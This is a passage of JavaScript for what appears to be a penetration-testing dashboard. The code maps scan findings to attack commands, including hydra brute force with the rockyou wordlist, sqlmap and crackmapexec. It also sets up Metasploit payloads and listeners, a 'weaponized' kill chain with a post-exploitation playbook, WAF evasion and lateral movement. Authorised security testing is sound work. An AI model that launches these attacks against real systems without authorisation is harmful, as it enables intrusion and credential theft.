  const api=SEC.api_endpoints||[];
  let pRows='';
  for(const e of api.slice(0,20)){
    pRows+=`<tr><td>${esc(e.type||'')}</td><td class="mono" style="max-width:280px;overflow:hidden;text-overflow:ellipsis">${esc(e.url||'')}</td><td>${e.endpoints_count??0}</td><td>${e.fuzzed??0}</td><td>${(e.vulns||[]).length?`<span class="kev-yes">${e.vulns.length}</span>`:'<span class="muted">0</span>'}</td></tr>`;
  }
  $('tb-p').innerHTML=pRows||'<tr><td colspan=5 class="empty">No API endpoints discovered.</td></tr>';
  // ---- NEW: MITRE ATT&CK ----
  const mc=L.mitre_coverage||{};
  const ml=L.mitre_layer||{};
  let mRows='';
  for(const tech of (ml.techniques||[]).slice(0,30)){
    mRows+=`<tr><td class="mono">${esc(tech.techniqueID||tech.id||'')}</td><td>${esc(tech.tactic||'')}</td><td>${esc(tech.cve||'')}</td><td class="mono" style="font-size:11px">${esc(tech.comment||tech.description||'')}</td><td>${esc(tech.platforms?.join(',')||'')}</td></tr>`;
  }
  if(!mRows && mc.techniques_mapped){
    for(const [cve,techs] of Object.entries(mc.techniques_mapped).slice(0,10)){
      for(const t of (techs||[]).slice(0,3)){
        mRows+=`<tr><td class="mono">${esc(t.id||'')}</td><td>${esc(t.tactic||'')}</td><td class="mono">${esc(cve)}</td><td><span class="muted">from CVE mapping</span></td><td>${esc(t.platforms?.join(',')||'')}</td></tr>`;
      }
    }
  }
  $('tb-m').innerHTML=mRows||'<tr><td colspan=5 class="empty">No MITRE ATT&CK mappings. Run with --mitre.</td></tr>';
        // ---- NEW: MITRE Matrix UI ----
      if(curTab==='mitre'){
        fetch('/api/mitre-heatmap').then(r=>r.json()).then(d=>{
          const svg=document.getElementById('mitre-svg');
          const w=svg.parentElement.clientWidth;
          const h=400;
          const cols=14;
          const rows=d.tactics?.length||0;
          const cellW=w/cols;
          const cellH=h/rows;
          while(svg.firstChild)svg.removeChild(svg.firstChild);
          const NS='http://www.w3.org/2000/svg';
          d.matrix.forEach((row,i)=>{
            row.techniques.forEach((cell,j)=>{
              const rect=document.createElementNS(NS,'rect');
              rect.setAttribute('x',j*cellW);
              rect.setAttribute('y',i*cellH);
              rect.setAttribute('width',cellW);
              rect.setAttribute('height',cellH);
              rect.setAttribute('fill',cell.covered?'#ff4444':'#555');
              const title=document.createElementNS(NS,'title');
              title.textContent=`${cell.techniqueID||cell.id}: ${cell.covered?'covered':'not'}`;
              rect.appendChild(title);
              svg.appendChild(rect);
            });
          });
        });
      }
      // ---- NEW: Topology UI ----
      if(curTab==='topo'){
        fetch('/api/topology').then(r=>r.json()).then(d=>{
          const svg=document.getElementById('topo-svg');
          const w=svg.parentElement.clientWidth;
          const h=400;
          while(svg.firstChild)svg.removeChild(svg.firstChild);
          const NS='http://www.w3.org/2000/svg';
          const nodes=d.nodes||[];
          const edges=d.edges||[];
          const cx=w/2, cy=h/2, R=Math.min(w,h)/3;
          nodes.forEach((n,i)=>{
            const angle=2*Math.PI*i/nodes.length;
            n.x=cx+R*Math.cos(angle);
            n.y=cy+R*Math.sin(angle);
          });
          edges.forEach(e=>{
            const src=nodes.find(n=>n.id===e.source);
            const tgt=nodes.find(n=>n.id===e.target);
            if(src&&tgt){
              const line=document.createElementNS(NS,'line');
              line.setAttribute('x1',src.x);
              line.setAttribute('y1',src.y);
              line.setAttribute('x2',tgt.x);
              line.setAttribute('y2',tgt.y);
              line.setAttribute('stroke','#ff4444');
              line.setAttribute('stroke-width','1');
              svg.appendChild(line);
            }
          });
          nodes.forEach(n=>{
            const circ=document.createElementNS(NS,'circle');
            circ.setAttribute('cx',n.x);
            circ.setAttribute('cy',n.y);
            const risk=n.risk||0;
            const r=8+risk;
            const fill=risk>7?'#ff2200':risk>4?'#ffb000':'#e62e00';
            circ.setAttribute('r',r);
            circ.setAttribute('fill',fill);
            const title=document.createElementNS(NS,'title');
            title.textContent=n.host;
            circ.appendChild(title);
            svg.appendChild(circ);
          });
        });
      }
      // ---- NEW: Attack Chain UI ----
      if(curTab==='chain'){
        const sid=$('dom').value;
        fetch(`/api/attack-chain?scan_id=${sid}`).then(r=>r.json()).then(d=>{
          const wrap=document.getElementById('chain-content');
          while(wrap.firstChild)wrap.removeChild(wrap.firstChild);
          if(!Array.isArray(d)||d.length===0){
            wrap.innerHTML='<div class="empty">No attack chain data.</div>';
            return;
          }
          d.forEach(item=>{
            const div=document.createElement('div');
            div.style='margin-bottom:8px;padding:6px;background:var(--panel2);border:1px solid var(--bd);border-radius:6px';
            const cat=document.createElement('div');
            cat.textContent=item.category||'';
            const tool=document.createElement('div');
            tool.textContent='Tool: '+(item.tool||'');
            const target=document.createElement('div');
            target.textContent='Target: '+(item.target||'');
            const cmd=document.createElement('code');
            cmd.textContent=item.cmd||'';
            const btn=document.createElement('button');
            btn.className='btn ghost';
            btn.textContent='Execute';
            btn.onclick=()=>{if(confirm('Run '+item.tool+'?')){fetch('/api/action/propose',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tool:item.tool,cmd:item.cmd,target:item.target,finding:item.finding||''})}).then(r=>r.json()).then(r=>{if(r.ok)alert('proposed');else alert(r.error);});}};
            const tbtn=document.createElement('button');
            tbtn.className='btn atk';tbtn.textContent='🖥 Terminal';
            tbtn.onclick=()=>{fetch('/api/action/terminal',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tool:item.tool,cmd:item.cmd,target:item.target,finding:item.finding||''})}).then(r=>r.json()).then(j=>{if(j.ok){alert('Terminal ready (command pre-filled, not executed):\n\n'+j.cmd+'\n\nAttach: '+j.attach_cmd);if(navigator.clipboard)navigator.clipboard.writeText(j.attach_cmd).catch(()=>{})}else alert(j.error||'failed')})};
            div.append(cat,tool,target,cmd,btn,tbtn);
            wrap.appendChild(div);
          });
        });
      }
      // ---- NEW: SBOM ----
  const sb=L.sbom_analysis||{};
  let bRows='';
  for(const dep of (sb.dependencies||[]).slice(0,30)){
    const osv=(dep.osv_vulns||[]).length?`<span class="kev-yes">${dep.osv_vulns.length}</span>`:'<span class="muted">0</span>';
    bRows+=`<tr><td class="mono">${esc(dep.name||'')}</td><td class="mono">${esc(dep.version||'')}</td><td class="mono">${esc(dep.purl||'')}</td><td>${esc((dep.licenses||[]).join(', ')||'—')}</td><td>${osv}</td></tr>`;
  }
  $('tb-b').innerHTML=bRows||'<tr><td colspan=5 class="empty">No SBOM data. Run with --sbom.</td></tr>';
  // ---- NEW: Reports ----
  const rep=L.report_path||L.reports||{};
  let rContent='';
  if(typeof rep==='string' && rep){
    rContent=`<div style="padding:14px"><b>Report generated:</b> <code class="mono">${esc(rep)}</code></div>`;
  }else if(typeof rep==='object'){
    for(const [type,path] of Object.entries(rep)){
      if(path) rContent+=`<div style="padding:8px 14px;border-bottom:1px solid var(--bd)"><b>${esc(type)}:</b> <code class="mono">${esc(path)}</code></div>`;
    }
  }
  $('report-content').innerHTML=rContent||'<div class="empty">No reports generated. Run scan with --report executive|technical|compliance|all</div>';
  // ---- NEW: Integrations ----
  const ints=L.integrations_status||{};
  let iRows='';
  for(const [type,status] of Object.entries(ints)){
    iRows+=`<tr><td>${esc(type)}</td><td class="mono">${esc(status.target||'')}</td><td>${status.ok?'<span style="color:var(--ok)">OK</span>':'<span class="kev-yes">FAIL</span>'}</td><td class="mono" style="font-size:11px">${esc(JSON.stringify(status.config||{})).slice(0,120)}</td></tr>`;
  }
  $('tb-i').innerHTML=iRows||'<tr><td colspan=4 class="empty">No integrations configured. Use --integrations config file.</td></tr>';
  // ---- NEW: Red Team ----
  const rt=L.redteam_actions||[];
  let rtContent='';
  if(Array.isArray(rt) && rt.length){
    rtContent='<table><thead><tr><th>Category</th><th>Tool</th><th>Target</th><th>Command</th><th>Requires Auth</th></tr></thead><tbody>';
    for(const a of rt.slice(0,20)){
      rtContent+=`<tr><td>${esc(a.category||'')}</td><td><b>${esc(a.tool||'')}</b></td><td class="mono">${esc(a.target||'')}</td><td class="mono" style="max-width:320px;overflow:hidden;text-overflow:ellipsis">${esc(a.cmd||'')}</td><td>${a.requires_auth?'<span class="kev-yes">YES</span>':'<span style="color:var(--ok)">NO</span>'}</td></tr>`;
    }
    rtContent+='</tbody></table>';
  }else{
    rtContent='<div class="empty">No Red Team actions mapped. Run scan with --redteam.</div>';
  }
  $('redteam-content').innerHTML=rtContent;
  // ---- NEW: MSF Exploit suggestions (check-then-payload) ----
  const msf=SEC.msf_suggestions||[];
  let msfRows='';
  for(const s of msf.slice(0,40)){
   const isExp=s.stage==='exploit';
   const badge=isExp?'<span class="sev-badge sv-critical">EXPLOIT</span>':'<span class="sev-badge sv-medium">CHECK</span>';
   const act=`<button class="btn atk" onclick="termAction(this.dataset)" data-tool="metasploit" data-cmd="${esc(s.cmd)}" data-target="${esc(s.host)}" data-finding="${esc(s.description||'')}">🖥 msfconsole</button>`;
   msfRows+=`<tr><td class="mono muted" style="white-space:nowrap">${esc(s.host)}<span class="muted">:${esc(s.port)}</span></td><td style="white-space:nowrap">${esc(s.product||s.service||'')}${s.version?` <span class="muted">${esc(s.version)}</span>`:''}</td><td>${badge}</td><td style="white-space:nowrap">${act}</td><td class="mono" style="font-size:11px;max-width:230px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(s.module)}">${esc(s.module)}${isExp?`<br><span class="muted" style="white-space:normal">payload: ${esc(s.payload)} · LHOST: ${esc(s.lhost)}</span>`:''}</td></tr>`;
  }
  $('tb-msf').innerHTML=msfRows||'<tr><td colspan=5 class="empty">No Metasploit mappings — run a scan with port detection (msf mapping is automatic).</td></tr>';
  $('nscans').textContent=st.scans.length+' scans';
  drawChart(st.scans.slice().reverse());
  // live engine state
  const live=st.live||{};
  if(live.running){$('engine-dot').classList.remove('off');$('engine-st').textContent='scanning '+live.domain;$('livephase').textContent=live.phase+' · '+live.progress+'%';
   $('phase').textContent=live.phase;$('pct').textContent=live.progress+'%';$('pbar').style.width=live.progress+'%';setBtn(true)}
  else{$('engine-dot').classList.add('off');$('engine-st').textContent='idle';$('livephase').textContent='';
   setBtn(false);
   if(live.exit!==null&&live.exit!==undefined){$('phase').textContent='Scan finished (exit '+live.exit+')';$('pbar').style.width='100%';$('pct').textContent=''}
   // Render persisted scan output into the terminal (page reload after scan)
   const LL=st.live_lines||[];
   if(LL.length){
    window.__asLiveRendered=true; // stop the boot typewriter from overwriting
    $('log').innerHTML=LL.map(l=>{const e=esc(md(l));
     if(/WARNING|CRITICAL|SPOOF/i.test(l))return '<span class="warn">'+e+'</span>';
     if(/ERROR|FAIL/i.test(l))return '<span class="err">'+e+'</span>';
     if(/\[\+\]|Done|saved|PDF|Hunt/i.test(l))return '<span class="ok">'+e+'</span>';
     return e}).join('\n');
    $('log').scrollTop=1e9;
   }}
 }catch(e){console.warn(e)}}

function setBtn(d){$('btn').disabled=d;$('btn').textContent=d?'⏳ Scanning…':'▶ Run Scan'}

function startScan(){
 const dom=$('dom').value.trim();if(!dom)return alert('Enter a target domain');
 fetch('/api/scan',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({domain:dom,max_subs:+$('ms').value||30})})
 .then(r=>r.json()).then(j=>{if(!j.ok)alert(j.error||'A scan is already running');else{listenSSE();setTimeout(refresh,600)}});
}
function drawChart(scans){
 const c=$('chart'),x=c.getContext('2d');
 if(c.width!==c.clientWidth)c.width=c.clientWidth;
 x.clearRect(0,0,c.width,c.height);
 const pts=scans.map(s=>s.risk_score??0);
 const W=c.width,H=c.height,pad=34,n=Math.max(pts.length,2);
 x.strokeStyle='#2a0d0d';x.lineWidth=1;
 for(let g=0;g<=4;g++){const gy=10+(H-34)*g/4;x.beginPath();x.moveTo(pad,gy);x.lineTo(W-10,gy);x.stroke();
  x.fillStyle='#8a7f78';x.font='10px monospace';x.fillText(String(100-g*25),4,gy+3)}
  x.strokeStyle='#e62e00';x.lineWidth=2;x.beginPath();
 pts.forEach((p,i)=>{const px=pad+(W-pad-20)*i/(n-1),py=10+(H-34)*(1-Math.min(p,100)/100);i?x.lineTo(px,py):x.moveTo(px,py)});
 x.stroke();
 x.fillStyle='#ff8c42';
 pts.forEach((p,i)=>{const px=pad+(W-pad-20)*i/(n-1),py=10+(H-34)*(1-Math.min(p,100)/100);x.beginPath();x.arc(px,py,3.5,0,7);x.fill()});
 if(!pts.length){x.fillStyle='#8a7f78';x.fillText('no data yet',pad+20,H/2)}}
// ---- Action Center ----
function attackFor(text, host){
 const t=String(text).toLowerCase();
 const u=host&&host.startsWith('http')?host:'https://'+host;
 const UL='/usr/share/metasploit-framework/data/wordlists/unix_users.txt',PL='/usr/share/wordlists/rockyou.txt';
 if(/sql inj|sqli|database error/.test(t))return{tool:'sqlmap',cmd:`sqlmap -u '${u}' --batch --level=1 --risk=1 --threads=2`};
 if(/brute|weak pass|default cred|credential|password spray/.test(t))return{tool:'hydra',cmd:`hydra -L ${UL} -P ${PL} ${host} ssh`};
 if(/\bftp\b|:21\b/.test(t)&&/open|expos|public/.test(t))return{tool:'hydra',cmd:`hydra -L ${UL} -P ${PL} ${host} ftp`};
 if(/telnet|:23\b/.test(t))return{tool:'hydra',cmd:`hydra -L ${UL} -P ${PL} ${host} telnet`};
 if(/\brdp\b|:3389\b|ms-wbt/.test(t))return{tool:'hydra',cmd:`hydra -L ${UL} -P ${PL} ${host} rdp`};
 if(/wordpress|wp-content|xmlrpc|rest user/.test(t))return{tool:'wpscan',cmd:`wpscan --url ${u} --enumerate vp,vt,u --no-update`};
 if(/mysql|:3306\b|postgres|:5432\b|redis|:6379\b|mongo|:27017\b|database port/.test(t))return{tool:'nmap',cmd:`nmap -sV -sC -p 3306,5432,6379,27017 ${host}`};
 if(/\bsmb\b|:445\b|microsoft-ds/.test(t))return{tool:'crackmapexec',cmd:`crackmapexec smb ${host}`};
 if(/public exposure|open port|exposed port/.test(t))return{tool:'nmap',cmd:`nmap -sV -sC --top-ports 100 ${host}`};
 if(/takeover/.test(t))return{tool:'subzy',cmd:`subzy run --targets ${host}`};
 if(/tls|ssl|certificate/.test(t))return{tool:'testssl.sh',cmd:`testssl.sh --quiet ${host}`};
 if(/admin panel|login/.test(t))return{tool:'nuclei',cmd:`nuclei -target ${u} -t http/cves/ -severity medium,high,critical`};
 if(/directory listing|index of/.test(t))return{tool:'nikto',cmd:`nikto -h ${u}`};
 return null}
function proposeAction(ds){
 if(!confirm('⚔ Launch '+ds.tool+' against '+ds.target+'?\n'+ds.cmd))return;
 fetch('/api/action/propose',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({tool:ds.tool,cmd:ds.cmd,target:ds.target,finding:ds.finding})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){alert('Tool not installed on this machine: '+ds.tool);return}
  // auto-confirm after operator approved via browser confirm dialog
  fetch('/api/action/confirm',{method:'POST',headers:{'Content-Type':'application/json'},
   body:JSON.stringify({id:j.action.id,approved:true})})
  .then(()=>{tab('j',document.getElementById('jbtn'));pollJobs()});
 })}
function termAction(ds){
 fetch('/api/action/terminal',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({tool:ds.tool,cmd:ds.cmd,target:ds.target,finding:ds.finding||''})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){alert('🖥 Terminal failed: '+(j.error||'unknown error'));return}
  const msg='🖥 Terminal ready — command PRE-FILLED (not executed)\n\n'+j.cmd+
   '\n\nAttach with:\n'+j.attach_cmd+
   (j.auto_opened?'\n\n(local terminal opened — press Enter to launch)':'\n\n(run the attach command in your terminal)');
  alert(msg);
  if(navigator.clipboard&&j.attach_cmd)navigator.clipboard.writeText(j.attach_cmd).catch(()=>{});
 })}
function copyTxt(s){if(navigator.clipboard)navigator.clipboard.writeText(s).catch(()=>{});alert('Copied:\n'+s)}

// ---- MSF live advisor + WAF scan (global scope) ----
function msfSearch(){
 const q=$('msf-q').value.trim();if(!q){alert('Enter a CVE (CVE-YYYY-NNNN) or keyword');return}
 $('msf-adv').style.display='';$('msf-adv').innerHTML='<span class="muted">⏳ querying msfrpcd…</span>';
 fetch('/api/msf/search',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({query:q})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){$('msf-adv').innerHTML='<span class="kev-yes">⚠ '+(j.error||'search failed')+'</span>';return}
  const rows=(j.modules||[]).map(m=>{
   const rk=m.rank>=500?'sv-critical':m.rank>=400?'sv-high':'sv-medium';
   return `<tr><td class="mono" style="font-size:11px">${esc(m.name)}</td><td><span class="sev-badge ${rk}">${esc(m.rank_label)}</span></td><td class="muted" style="font-size:11px">${esc(m.description).slice(0,110)}</td><td><button class="btn atk" onclick="msfPrep(this.dataset)" data-module="${esc(m.name)}">🖥 Prepare</button></td></tr>`}).join('');
  $('msf-adv').innerHTML=`<div class="muted" style="margin-bottom:6px">${(j.modules||[]).length} exploit module(s) — rpc: ${esc(j.rpc_host||'')}</div><table><thead><tr><th>Module</th><th>Rank</th><th>Description</th><th></th></tr></thead><tbody>${rows||'<tr><td colspan=4 class="empty">no modules matched</td></tr>'}</tbody></table>`;
 })}
function msfPrep(ds){
 const t=($('dom').value.trim())||prompt('Target host for the resource script:');
 if(!t)return;
 fetch('/api/msf/prepare',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({module:ds.module,target:t})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){alert('prepare failed: '+(j.error||''));return}
  $('term-prefill-cmd').value=j.cmd;
  const btn=document.querySelector('#sidebar .nav-btn[data-t="term"]');
  if(btn)btn.click();
  alert('Resource script written to '+j.rc_path+'\n\nmsfconsole command pre-filled in the Terminal tab:\n'+j.cmd);
 })}
function msfWaf(){
 $('msf-waf').style.display='';$('msf-waf').innerHTML='<span class="muted">⏳ probing hosts for WAF signatures…</span>';
 const sid=(st_cache&&st_cache.latest&&st_cache.latest.id)||'';
 fetch('/api/waf/scan',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({scan_id:sid,evasion:true})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){$('msf-waf').innerHTML='<span class="kev-yes">⚠ '+(j.error||'WAF scan failed')+'</span>';return}
  const hits=j.waf_hits||{};
  const keys=Object.keys(hits);
  if(!keys.length){$('msf-waf').innerHTML='<span class="muted">✅ no WAF signatures found on '+j.hosts_probed+' probed host(s)</span>';return}
  $('msf-waf').innerHTML=keys.map(h=>{
   const x=hits[h];const ev=x.evasion||{};
   return `<div style="padding:6px 0;border-bottom:1px solid #1a0a0a"><b style="color:var(--crit)">🛡 ${esc(h)}</b> — WAF: <b>${esc(x.waf)}</b> <span class="muted">(${esc(x.evidence)})</span>
    ${ev.note?`<div class="muted" style="font-size:11px">evasion: ${esc(ev.note)}${(ev.ports_found||[]).length?` · ports still visible: ${ev.ports_found.map(p=>p.port+'/'+p.service).join(', ')}`:''}</div>`:''}</div>`}).join('');
 })}

// ---- Attack Graph (force-directed SVG) ----
function chainsRender(chains){
 const el=$('graph-chains');if(!el)return;
 if(!chains||!chains.length){el.innerHTML='<div class="muted" style="padding:8px 14px;border-top:1px solid var(--bd)">no linkable attack chain found — every candidate failed a prerequisite or had no follow-up</div>';return}
 const badge=c=>c==='strong'?'#f85149':c==='plausible'?'#ffb000':'#8b949e';
 el.innerHTML='<div class="muted" style="padding:8px 14px 2px;font-weight:600">⛓ Attack chains ('+chains.length+')</div>'+
  chains.map(c=>{
   const steps=c.steps.map(s=>'<b>'+esc(s.technique)+'</b> <span class="muted">on</span> '+esc(s.target)).join('<br><span style="opacity:.55">└→</span> ');
   return '<div style="padding:7px 14px;border-top:1px solid var(--bd)">'+
    '<span style="color:'+badge(c.confidence)+';font-weight:600">['+esc(c.confidence)+']</span> '+
    '<b>'+(c.probability*100).toFixed(1)+'%</b> '+
    '<span class="muted">· '+c.hops+' hops · score '+c.score+'</span>'+
    '<div style="margin:5px 0 3px 12px;line-height:1.55">'+steps+'</div>'+
    '<div class="muted" style="font-size:11px;margin-left:12px">'+esc(c.reason)+'</div></div>';
  }).join('');
}
function graphBuild(){
 const sid=(st_cache&&st_cache.latest&&st_cache.latest.id)||'';
 if(!sid){alert('No scan data available');return}
 $('graph-status').textContent='⏳ building graph…';
 fetch('/api/graph/build',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({scan_id:sid})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){$('graph-status').textContent='⚠ '+(j.error||'failed');return}
  const g=j.graph;$('graph-status').textContent=g.stats.nodes+' nodes, '+g.stats.edges+' edges'+(g.chains?(' · '+g.chains.length+' chain(s)'):'');
  graphRender(g);
  chainsRender(g.chains);
 })}
function graphRender(g){
 const W=$('graph-canvas').clientWidth||900, H=520;
 const NS='http://www.w3.org/2000/svg';
 const svg=document.createElementNS(NS,'svg');
 svg.setAttribute('width',W);svg.setAttribute('height',H);
 svg.style.background='#000';
 // layout: radial by type
 const types=['Internet','CDN','Subdomain','Origin','Service','Vulnerability','CVE','AdminPanel','Email','Technology'];
 const typeColor={'Internet':'#888','CDN':'#4f8ff7','Subdomain':'#e62e00','Origin':'#ff8c42',
  'Service':'#ffb000','Vulnerability':'#ff2200','CVE':'#ff2200','AdminPanel':'#f85149','Email':'#c9d4de','Technology':'#3fb950'};
 const cx=W/2, cy=H/2, R=Math.min(W,H)/2.4;
 const nodes=g.nodes.map((n,i)=>{
  const ti=types.indexOf(n.type);
  const ang=(i/g.nodes.length)*Math.PI*2;
  const r=n.type==='Subdomain'||n.type==='Origin'?R*0.55:R;
  return {...n,x:cx+r*Math.cos(ang),y:cy+r*Math.sin(ang),color:typeColor[n.type]||'#888'};
 });
 const nodeMap={};nodes.forEach(n=>nodeMap[n.id]=n);
 // edges
 g.edges.forEach(e=>{
  const s=nodeMap[e.source],t=nodeMap[e.target];
  if(!s||!t)return;
  const line=document.createElementNS(NS,'line');
  line.setAttribute('x1',s.x);line.setAttribute('y1',s.y);
  line.setAttribute('x2',t.x);line.setAttribute('y2',t.y);
  line.setAttribute('stroke',e.risk>=70?'#ff2200':e.risk>=40?'#ffb000':'#333');
  line.setAttribute('stroke-width',Math.max(1,e.risk/30));
  line.setAttribute('opacity','0.6');
  svg.appendChild(line);
 });
 // nodes
 nodes.forEach(n=>{
  const c=document.createElementNS(NS,'circle');
  c.setAttribute('cx',n.x);c.setAttribute('cy',n.y);
  c.setAttribute('r',n.type==='Subdomain'?5:n.type==='Vulnerability'?7:6);
  c.setAttribute('fill',n.color);
  c.setAttribute('stroke','#000');c.setAttribute('stroke-width','1');
  const title=document.createElementNS(NS,'title');
  title.textContent=n.label+(n.risk?' ['+n.risk+']':'');
  c.appendChild(title);
  svg.appendChild(c);
  if(n.type==='Vulnerability'||n.type==='AdminPanel'){
   const t=document.createElementNS(NS,'text');
   t.setAttribute('x',n.x+8);t.setAttribute('y',n.y+3);
   t.setAttribute('fill',n.color);t.setAttribute('font-size','9');
   t.setAttribute('font-family','monospace');
   t.textContent=n.label.slice(0,30);
   svg.appendChild(t);
  }
 });
 $('graph-canvas').innerHTML='';
 $('graph-canvas').appendChild(svg);
 // legend
 const counts=g.stats.by_type||{};
 $('graph-legend').innerHTML=Object.entries(counts).map(([t,c])=>
  `<span style="margin-inline-end:14px"><span style="display:inline-block;width:10px;height:10px;border-radius:50%;background:${typeColor[t]||'#888'};margin-inline-end:4px"></span>${esc(t)} (${c})</span>`
 ).join('');
}

// ---- Cred Engine ----
function credsAnalyze(){
 const sid=(st_cache&&st_cache.latest&&st_cache.latest.id)||'';
 if(!sid){alert('No scan data available');return}
 $('creds-status').textContent='⏳ analyzing services…';
 fetch('/api/creds/analyze',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({scan_id:sid})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){$('creds-status').textContent='⚠ '+(j.error||'failed');return}
  const sugs=j.suggestions||[];
  $('creds-status').textContent=sugs.length+' credential attack suggestion(s)';
  let rows='';
  for(const s of sugs.slice(0,30)){
   const act=`<button class="btn atk" onclick="termAction(this.dataset)" data-tool="hydra" data-cmd="${esc(s.cmd)}" data-target="${esc(s.host)}" data-finding="${esc(s.notes||'')}">🖥 Terminal</button>`;
   rows+=`<tr><td class="mono muted">${esc(s.host)}</td><td><b>${esc(s.service)}</b></td><td><span class="sev-badge ${s.mode==='default_creds'?'sv-high':'sv-medium'}">${esc(s.mode)}</span></td><td class="mono" style="font-size:10.5px;max-width:340px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(s.cmd)}">${esc(s.cmd)}</td><td>${act}</td></tr>`;
  }
  $('tb-creds').innerHTML=rows||'<tr><td colspan=5 class="empty">No credential attack surfaces found — no auth services detected.</td></tr>';
 })}

// ---- Origin Hunter ----
function originHunt(){
 const dom=$('dom').value.trim();
 if(!dom){alert('Enter a target domain first');return}
 const sid=(st_cache&&st_cache.latest&&st_cache.latest.id)||'';
 $('origin-status').textContent='⏳ hunting origin IP…';
 fetch('/api/origin/hunt',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({domain:dom,scan_id:sid})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){$('origin-status').textContent='⚠ '+(j.error||'failed');return}
  const cands=j.candidates||[];
  $('origin-status').textContent=cands.length+' candidate(s) found';
  if(!cands.length){$('origin-results').innerHTML='<div class="muted">No origin IP candidates found — target may not be CDN-fronted.</div>';return}
  $('origin-results').innerHTML=cands.map(c=>{
   const conf=c.confidence||0;
   const col=conf>=80?'var(--crit)':conf>=60?'var(--hi)':'var(--warn)';
   return `<div style="padding:8px 0;border-bottom:1px solid #1a0a0a">
    <b class="mono" style="font-size:14px;color:${col}">${esc(c.ip)}</b>
    <span class="sev-badge ${conf>=80?'sv-critical':conf>=60?'sv-high':'sv-medium'}" style="margin-inline-start:8px">${conf}% confidence</span>
    ${c.validated?'<span class="sev-badge sv-critical" style="margin-inline-start:6px">✓ VALIDATED</span>':''}
    <div class="muted" style="font-size:11px;margin-top:3px">${esc(c.evidence||'')}${c.http_status?` · HTTP ${esc(c.http_status)}`:''}${(c.subdomains||[]).length?` · subs: ${esc(c.subdomains.join(', '))}`:''}</div>
   </div>`}).join('');
 })}

function killChainBuild(){
 const sid=(st_cache&&st_cache.latest&&st_cache.latest.id)||'';
 const dom=$('dom').value.trim();
 const lhost=$('kc-lhost').value;
 if(!sid&&!dom){alert('Run a scan first or enter a domain');return}
 $('kc-status').textContent='⏳ building kill chain…';
 fetch('/api/killchain/build',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({scan_id:sid,domain:dom,lhost:lhost})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){$('kc-status').textContent='⚠ '+(j.error||'failed');return}
  const plans=j.plans||[];
  $('kc-status').textContent=plans.length+' target(s) weaponized';
  if(!plans.length){$('kc-results').innerHTML='<div class="muted">No weaponizable findings in this scan. Run a deeper scan or select a different target.</div>';return}
  $('kc-results').innerHTML=plans.map(p=>{
   const w=p.weaponization||{}, lis=p.listener||{}, ic=p.interceptor||{}, sv=p.sliver||{};
   const cmds=(p.terminal_commands||[]);
   return `<div style="padding:10px 0;border-bottom:1px solid #1a0a0a">
    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
     <b class="mono" style="font-size:14px">${esc(p.target)}</b>
     <span class="sev-badge sv-medium">${esc(p.os_type)}</span>
     <span class="sev-badge sv-high">${esc(p.service)}</span>
     <span class="muted" style="font-size:11px">${esc(p.vuln||'')}</span>
    </div>
    <div style="margin-top:6px;font-size:12px">
     <div>🎯 <b>Exploit:</b> <code>${esc(w.exploit||'N/A')}</code></div>
     <div>💉 <b>Payload:</b> <code>${esc(w.payload||'')}</code></div>
     <div>📡 <b>Listener:</b> <code>${esc(lis.lhost||'')}:${esc(String(lis.lport||''))}</code></div>
     <div>🩸 <b>Sliver alt:</b> <code>${esc(sv.format||'')} implant on port ${esc(String(sv.lport||''))}</code></div>
     ${w.warning?`<div style="color:var(--warn)">⚠ ${esc(w.warning)}</div>`:''}
    </div>
    ${cmds.length?`<details style="margin-top:6px"><summary class="muted" style="cursor:pointer;font-size:12px">📋 Terminal commands (${cmds.length})</summary>
     <div style="margin-top:4px">${cmds.map(c=>`<div style="margin:4px 0"><span class="muted" style="font-size:11px">${esc(c.label)}</span><pre class="mono" style="margin:2px 0;padding:6px;background:#0a0505;border-radius:4px;font-size:11px;overflow-x:auto;white-space:pre-wrap">${esc(c.command)}</pre></div>`).join('')}</div>
    </details>`:''}
    ${ic.script?`<details style="margin-top:4px"><summary class="muted" style="cursor:pointer;font-size:12px">🖥 Post-exploitation playbook</summary><pre class="mono" style="margin:4px 0;padding:6px;background:#0a0505;border-radius:4px;font-size:11px;overflow-x:auto;white-space:pre-wrap">${esc(ic.script)}</pre></details>`:''}
   </div>`}).join('');
 })}

function lateralBuild(){
 const sid=(st_cache&&st_cache.latest&&st_cache.latest.id)||'';
 const source=$('lat-source').value.trim();
 const subnet=$('lat-subnet').value.trim();
 if(!sid){alert('Run a scan first');return}
 $('lat-status').textContent='⏳ discovering internal targets…';
 fetch('/api/lateral/build',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({scan_id:sid,source_host:source,subnet:subnet})})
 .then(r=>r.json()).then(j=>{
  if(!j.ok){$('lat-status').textContent='⚠ '+(j.error||'failed');return}
  const chain=j.chain||[];
  const mv=j.movements||[];
  $('lat-status').textContent=j.summary||'done';
  // Render pivot chain
  if(chain.length){
   $('lat-chain').innerHTML='<div style="font-weight:600;margin-bottom:6px">🔗 Pivot Chain</div>'+
    chain.map(h=>`<div style="display:flex;gap:6px;align-items:center;padding:3px 0;font-size:12px">
     <span class="sev-badge sv-medium">Hop ${h.hop}</span>
     <b class="mono">${esc(h.from)}</b>
